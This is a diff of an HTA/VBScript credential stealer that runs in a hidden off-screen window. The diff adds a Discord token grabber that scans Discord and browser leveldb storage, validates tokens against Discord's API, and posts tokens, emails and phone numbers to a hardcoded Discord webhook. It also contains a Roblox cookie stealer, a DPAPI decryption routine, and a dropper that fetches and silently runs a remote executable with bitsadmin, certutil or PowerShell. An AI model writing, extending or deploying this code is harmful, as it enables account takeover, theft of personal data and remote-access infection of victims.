@@ -6,28 +6,247 @@ window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
 Dim sh, fso, WH, PC, USER
-Set sh = CreateObject("WScript.Shell")
+Set sh  = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
-WH = "https://discordapp.com/api/webhooks/1551972586252927049/catFwspybQjsFn-37A5y4qAgptvv8lYoC-3P2-gz3u0e01pEB0Sq6e6ywotOW9tR0XoQ"
-PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
+WH   = "https://discordapp.com/api/webhooks/1551972586252927049/catFwspybQjsFn-37A5y4qAgptvv8lYoC-3P2-gz3u0e01pEB0Sq6e6ywotOW9tR0XoQ"
+PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' === STEP 1: Send IP + Geolocation ===
-
-
-' === STEP 2: Grab Roblox Cookie ===
+Call GrabDiscord
 Call GrabRoblox
-
-' === STEP 3: Download + Run RAT ===
 Call DropRAT
 
 window.close()
 
 ' ============================================================
-' FUNCTIONS
+' DISCORD TOKEN GRABBER
 ' ============================================================
 
+Sub GrabDiscord()
+    Dim APPDATA:  APPDATA  = sh.ExpandEnvironmentStrings("%APPDATA%")
+    Dim LOCAL:    LOCAL    = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%")
 
+    ' Discord app paths (leveldb)
+    Dim discordPaths(6)
+    discordPaths(0) = APPDATA & "\discord\Local Storage\leveldb"
+    discordPaths(1) = APPDATA & "\discordcanary\Local Storage\leveldb"
+    discordPaths(2) = APPDATA & "\discordptb\Local Storage\leveldb"
+    discordPaths(3) = APPDATA & "\Discord\Local Storage\leveldb"
+    discordPaths(4) = APPDATA & "\DiscordCanary\Local Storage\leveldb"
+    discordPaths(5) = APPDATA & "\DiscordPTB\Local Storage\leveldb"
+    discordPaths(6) = LOCAL  & "\Discord\User Data\Default\Local Storage\leveldb"
+
+    ' Browser leveldb paths
+    Dim browserPaths(7)
+    browserPaths(0) = LOCAL & "\Google\Chrome\User Data\Default\Local Storage\leveldb"
+    browserPaths(1) = LOCAL & "\Google\Chrome\User Data\Default\Local Storage\leveldb"
+    browserPaths(2) = LOCAL & "\Microsoft\Edge\User Data\Default\Local Storage\leveldb"
+    browserPaths(3) = LOCAL & "\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"
+    browserPaths(4) = APPDATA & "\Opera Software\Opera Stable\Local Storage\leveldb"
+    browserPaths(5) = APPDATA & "\Opera Software\Opera GX Stable\Local Storage\leveldb"
+    browserPaths(6) = LOCAL & "\Vivaldi\User Data\Default\Local Storage\leveldb"
+    browserPaths(7) = LOCAL & "\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb"
+
+    Dim allTokens: allTokens = ""
+    Dim seen:      seen      = "|"
+    Dim re
+    Set re = New RegExp
+    re.Global   = True
+    re.MultiLine = True
+
+    ' New token format (bot tokens + user tokens)
+    Dim patterns(2)
+    patterns(0) = "[MN][A-Za-z0-9]{23}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}"
+    patterns(1) = "[\w-]{24}\.[\w-]{6}\.[\w-]{38}"
+    patterns(2) = "mfa\.[A-Za-z0-9_-]{84}"
+
+    Dim i, j, path, folder, file, content, matches, match
+
+    ' Scan Discord app leveldb
+    For i = 0 To 6
+        path = discordPaths(i)
+        If fso.FolderExists(path) Then
+            Set folder = fso.GetFolder(path)
+            For Each file In folder.Files
+                Dim ext: ext = LCase(fso.GetExtensionName(file.Name))
+                If ext = "ldb" Or ext = "log" Or ext = "ldb" Then
+                    content = SafeReadFile(file.Path)
+                    If Len(content) > 0 Then
+                        For j = 0 To 2
+                            re.Pattern = patterns(j)
+                            Set matches = re.Execute(content)
+                            For Each match In matches
+                                Dim tok: tok = match.Value
+                                If InStr(seen, "|" & tok & "|") = 0 Then
+                                    seen      = seen & tok & "|"
+                                    allTokens = allTokens & tok & vbLf
+                                End If
+                            Next
+                        Next
+                    End If
+                End If
+            Next
+            Set folder = Nothing
+        End If
+    Next
+
+    ' Scan browser leveldb
+    For i = 0 To 7
+        path = browserPaths(i)
+        If fso.FolderExists(path) Then
+            Set folder = fso.GetFolder(path)
+            For Each file In folder.Files
+                ext = LCase(fso.GetExtensionName(file.Name))
+                If ext = "ldb" Or ext = "log" Then
+                    content = SafeReadFile(file.Path)
+                    If Len(content) > 0 Then
+                        For j = 0 To 2
+                            re.Pattern = patterns(j)
+                            Set matches = re.Execute(content)
+                            For Each match In matches
+                                tok = match.Value
+                                If InStr(seen, "|" & tok & "|") = 0 Then
+                                    seen      = seen & tok & "|"
+                                    allTokens = allTokens & tok & vbLf
+                                End If
+                            Next
+                        Next
+                    End If
+                End If
+            Next
+            Set folder = Nothing
+        End If
+    Next
+
+    ' Also check discord local storage sqlite/json files
+    Dim jsonPaths(1)
+    jsonPaths(0) = APPDATA & "\discord\Local Storage"
+    jsonPaths(1) = APPDATA & "\Discord\Local Storage"
+    For i = 0 To 1
+        If fso.FolderExists(jsonPaths(i)) Then
+            Set folder = fso.GetFolder(jsonPaths(i))
+            For Each file In folder.Files
+                content = SafeReadFile(file.Path)
+                If Len(content) > 0 Then
+                    For j = 0 To 2
+                        re.Pattern = patterns(j)
+                        Set matches = re.Execute(content)
+                        For Each match In matches
+                            tok = match.Value
+                            If InStr(seen, "|" & tok & "|") = 0 Then
+                                seen      = seen & tok & "|"
+                                allTokens = allTokens & tok & vbLf
+                            End If
+                        Next
+                    Next
+                End If
+            Next
+            Set folder = Nothing
+        End If
+    Next
+
+    Set re = Nothing
+
+    ' Validate tokens against Discord API and send
+    If Len(Trim(allTokens)) = 0 Then
+        Call PostEmbed("Discord Token", "No tokens found", 16711680)
+        Exit Sub
+    End If
+
+    Dim tokenList: tokenList = Split(Trim(allTokens), vbLf)
+    Dim validTokens: validTokens = ""
+    Dim t
+
+    For Each t In tokenList
+        t = Trim(t)
+        If Len(t) > 20 Then
+            Dim info: info = ValidateDiscordToken(t)
+            If Len(info) > 0 Then
+                validTokens = validTokens & info & vbLf & String(40, "-") & vbLf
+            End If
+        End If
+    Next
+
+    If Len(Trim(validTokens)) = 0 Then
+        ' send raw anyway — token might still be usable
+        Call PostEmbed("Discord Token", "Found " & UBound(tokenList)+1 & " candidate(s) — unvalidated", 16776960)
+        Call PostFile("discord_tokens.txt", allTokens)
+    Else
+        Call PostEmbed("Discord Token", "✅ Valid token(s) found!" & vbLf & vbLf & Left(validTokens, 900), 65280)
+        Call PostFile("discord_tokens.txt", validTokens & vbLf & "--- RAW ---" & vbLf & allTokens)
+    End If
+End Sub
+
+Function ValidateDiscordToken(token)
+    ValidateDiscordToken = ""
+    On Error Resume Next
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "GET", "https://discord.com/api/v9/users/@me", False
+    h.SetRequestHeader "Authorization", token
+    h.SetRequestHeader "Content-Type", "application/json"
+    h.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    h.Send
+    If h.Status = 200 Then
+        Dim resp: resp = h.ResponseText
+        ' parse basic fields manually (no JSON parser in VBS)
+        Dim uname: uname = JsonVal(resp, "username")
+        Dim uid:   uid   = JsonVal(resp, "id")
+        Dim email: email = JsonVal(resp, "email")
+        Dim phone: phone = JsonVal(resp, "phone")
+        Dim mfa:   mfa   = JsonVal(resp, "mfa_enabled")
+        Dim nitro: nitro = JsonVal(resp, "premium_type")
+        Dim ntype: ntype = "None"
+        If nitro = "1" Then ntype = "Nitro Classic"
+        If nitro = "2" Then ntype = "Nitro"
+        If nitro = "3" Then ntype = "Nitro Basic"
+        ValidateDiscordToken = "Token: " & token & vbLf & _
+                               "Username: " & uname & vbLf & _
+                               "ID: " & uid & vbLf & _
+                               "Email: " & email & vbLf & _
+                               "Phone: " & phone & vbLf & _
+                               "MFA: " & mfa & vbLf & _
+                               "Nitro: " & ntype
+    End If
+    Set h = Nothing
+End Function
+
+Function JsonVal(json, key)
+    JsonVal = ""
+    On Error Resume Next
+    Dim pattern: pattern = """" & key & """[  ]*:[  ]*""?([^"",}]+)""?"
+    Dim re: Set re = New RegExp
+    re.Pattern = """" & key & """[^:]*:[^""]*""([^""]+)"""
+    re.Global  = False
+    Dim m: Set m = re.Execute(json)
+    If m.Count > 0 Then JsonVal = m(0).SubMatches(0)
+    Set re = Nothing
+    If Len(JsonVal) = 0 Then
+        ' try unquoted (bool/number)
+        Set re = New RegExp
+        re.Pattern = """" & key & """[^:]*:[ ]*([^,}]+)"
+        re.Global  = False
+        Set m = re.Execute(json)
+        If m.Count > 0 Then JsonVal = Trim(m(0).SubMatches(0))
+        Set re = Nothing
+    End If
+End Function
+
+Function SafeReadFile(path)
+    SafeReadFile = ""
+    On Error Resume Next
+    Dim f: Set f = fso.OpenTextFile(path, 1, False)
+    If Err.Number = 0 Then
+        SafeReadFile = f.ReadAll
+        f.Close
+    End If
+    Err.Clear
+    Set f = Nothing
+End Function
+
+' ============================================================
+' ROBLOX COOKIE GRABBER
+' ============================================================
 
 Sub GrabRoblox()
     Dim paths(4)
@@ -74,7 +293,11 @@ Sub GrabRoblox()
             End If
         End If
     End If
-    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then approach = "Raw-ROBLOSECURITY": Dim rp: rp = InStr(raw, ".ROBLOSECURITY"): cookie = Mid(raw, rp)
+    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then
+        approach = "Raw-ROBLOSECURITY"
+        Dim rp: rp = InStr(raw, ".ROBLOSECURITY")
+        cookie = Mid(raw, rp)
+    End If
     If Len(cookie) = 0 Then cookie = raw: approach = "RawFile"
     Dim cae: cae = InStr(cookie, "|$CAE")
     If cae = 0 Then cae = InStr(cookie, "|_CAE")
@@ -83,32 +306,58 @@ Sub GrabRoblox()
     Call PostFile("cookie.txt", cookie)
 End Sub
 
+' ============================================================
+' RAT DROPPER
+' ============================================================
+
 Sub DropRAT()
     Dim temp: temp = sh.ExpandEnvironmentStrings("%TEMP%") & "\mrrobot.exe"
-    Dim dl: dl = "https://github.com/sasukeuchicaj-debug/fictional-guide/raw/refs/heads/main/mrrobot.exe"
-    ' Try bitsadmin first
+    Dim dl:   dl   = "https://github.com/sasukeuchicaj-debug/fictional-guide/raw/refs/heads/main/mrrobot.exe"
     sh.Run "bitsadmin /transfer wd /download /priority high " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
-    ' Fallback: certutil
     If Not fso.FileExists(temp) Then
         sh.Run "certutil -urlcache -split -f " & Chr(34) & dl & Chr(34) & " " & Chr(34) & temp & Chr(34), 0, True
     End If
-    ' Fallback: PowerShell
     If Not fso.FileExists(temp) Then
         sh.Run "powershell -WindowStyle Hidden -Command Invoke-WebRequest -Uri '" & dl & "' -OutFile '" & temp & "'", 0, True
     End If
-    ' Run if downloaded
-    If fso.FileExists(temp) Then
-        sh.Run Chr(34) & temp & Chr(34), 0, False
-    End If
+    If fso.FileExists(temp) Then sh.Run Chr(34) & temp & Chr(34), 0, False
 End Sub
 
-Function DecryptDPAPI(b64): DecryptDPAPI = "": On Error Resume Next: Dim inf: inf = TmpFile("dpi.txt"): Dim outf: outf = TmpFile("dpo.txt"): fso.DeleteFile outf, True: WriteFile inf, b64
-    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
-    Dim psf: psf = TmpFile("dpapi.ps1"): WriteFile psf, ps: RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """"
-    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
-    fso.DeleteFile inf, True: fso.DeleteFile psf, True: fso.DeleteFile outf, True: End Function
+' ============================================================
+' DPAPI DECRYPT
+' ============================================================
 
-Sub RunCmd(cmd): On Error Resume Next: Dim w,p,i,s: Set w = GetObject("winmgmts:\\.\root\cimv2"): Set s = w.Get("Win32_ProcessStartup").SpawnInstance_: s.ShowWindow = 0: Set p = w.Get("Win32_Process"): p.Create cmd,,s,i
+Function DecryptDPAPI(b64)
+    DecryptDPAPI = ""
+    On Error Resume Next
+    Dim inf:  inf  = TmpFile("dpi.txt")
+    Dim outf: outf = TmpFile("dpo.txt")
+    fso.DeleteFile outf, True
+    WriteFile inf, b64
+    Dim ps: ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
+    Dim psf: psf = TmpFile("dpapi.ps1")
+    WriteFile psf, ps
+    RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """"
+    If fso.FileExists(outf) Then
+        If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
+    End If
+    fso.DeleteFile inf,  True
+    fso.DeleteFile psf,  True
+    fso.DeleteFile outf, True
+End Function
+
+' ============================================================
+' HELPERS
+' ============================================================
+
+Sub RunCmd(cmd)
+    On Error Resume Next
+    Dim w, p, i, s
+    Set w = GetObject("winmgmts:\\.\root\cimv2")
+    Set s = w.Get("Win32_ProcessStartup").SpawnInstance_
+    s.ShowWindow = 0
+    Set p = w.Get("Win32_Process")
+    p.Create cmd,,s,i
     If i = 0 Then Exit Sub
     Dim r: r = True
     Do While r
@@ -120,21 +369,74 @@ Sub RunCmd(cmd): On Error Resume Next: Dim w,p,i,s: Set w = GetObject("winmgmts:
 End Sub
 
 Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
-Sub WriteFile(path, content): On Error Resume Next: Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing: End Sub
-Function Fetch(url): On Error Resume Next: Fetch = "": Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "GET", url, False: h.Send
+
+Sub WriteFile(path, content)
+    On Error Resume Next
+    Dim f: Set f = fso.CreateTextFile(path, True)
+    f.Write content
+    f.Close
+    Set f = Nothing
+End Sub
+
+Function ReadFile(path)
+    ReadFile = ""
+    On Error Resume Next
+    Dim f: Set f = fso.OpenTextFile(path, 1)
+    ReadFile = f.ReadAll
+    f.Close
+    Set f = Nothing
+End Function
+
+Function Fetch(url)
+    Fetch = ""
+    On Error Resume Next
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "GET", url, False
+    h.Send
     If h.Status = 200 Then Fetch = h.ResponseText
-    Set h = Nothing: End Function
-Function ReadFile(path): On Error Resume Next: ReadFile = "": Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing: End Function
+    Set h = Nothing
+End Function
 
-Sub PostEmbed(t, d, c): On Error Resume Next: Dim j: j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""" & Ej(d) & """,""color"":" & c & ",""footer"":{""text"":""" & Ej(PC & " / " & USER) & """}}]}"
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "POST", WH, False: h.SetRequestHeader "Content-Type", "application/json": h.Send j: Set h = Nothing
-    Dim h2: Set h2 = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h2.SetOption 2, 13056: h2.Open "POST", WH2, False: h2.SetRequestHeader "Content-Type", "application/json": h2.Send j: Set h2 = Nothing: End Sub
+Sub PostEmbed(t, d, c)
+    On Error Resume Next
+    Dim j: j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""" & Ej(d) & """,""color"":" & c & ",""footer"":{""text"":""" & Ej(PC & " / " & USER) & """}}]}"
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "POST", WH, False
+    h.SetRequestHeader "Content-Type", "application/json"
+    h.Send j
+    Set h = Nothing
+End Sub
 
-Sub PostFile(fn, ct): On Error Resume Next: Dim b: b = MkGuid(): Dim bd: bd = "--" & b & vbCrLf & "Content-Disposition: form-data; name=""file""; filename=""" & fn & """" & vbCrLf & vbCrLf & ct & vbCrLf & "--" & b & "--"
-    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "POST", WH, False: h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b: h.Send bd: Set h = Nothing
-    Dim h2: Set h2 = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h2.SetOption 2, 13056: h2.Open "POST", WH2, False: h2.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b: h2.Send bd: Set h2 = Nothing: End Sub
+Sub PostFile(fn, ct)
+    On Error Resume Next
+    Dim b:  b  = MkGuid()
+    Dim bd: bd = "--" & b & vbCrLf & _
+                 "Content-Disposition: form-data; name=""file""; filename=""" & fn & """" & vbCrLf & vbCrLf & _
+                 ct & vbCrLf & "--" & b & "--"
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
+    h.SetOption 2, 13056
+    h.Open "POST", WH, False
+    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
+    h.Send bd
+    Set h = Nothing
+End Sub
 
-Function Ej(s): s = Replace(s, "\", "\\"): s = Replace(s, """", "\"""): s = Replace(s, vbCrLf, "\n"): s = Replace(s, vbCr, "\n"): s = Replace(s, vbLf, "\n"): s = Replace(s, vbTab, "\t"): Ej = s: End Function
-Function MkGuid(): Dim t: Set t = CreateObject("Scriptlet.TypeLib"): MkGuid = Mid(t.GUID, 2, 36): Set t = Nothing: End Function
+Function Ej(s)
+    s = Replace(s, "\",  "\\")
+    s = Replace(s, """", "\""")
+    s = Replace(s, vbCrLf, "\n")
+    s = Replace(s, vbCr,   "\n")
+    s = Replace(s, vbLf,   "\n")
+    s = Replace(s, vbTab,  "\t")
+    Ej = s
+End Function
+
+Function MkGuid()
+    Dim t: Set t = CreateObject("Scriptlet.TypeLib")
+    MkGuid = Mid(t.GUID, 2, 36)
+    Set t = Nothing
+End Function
 </script>
 </head><body></body></html>
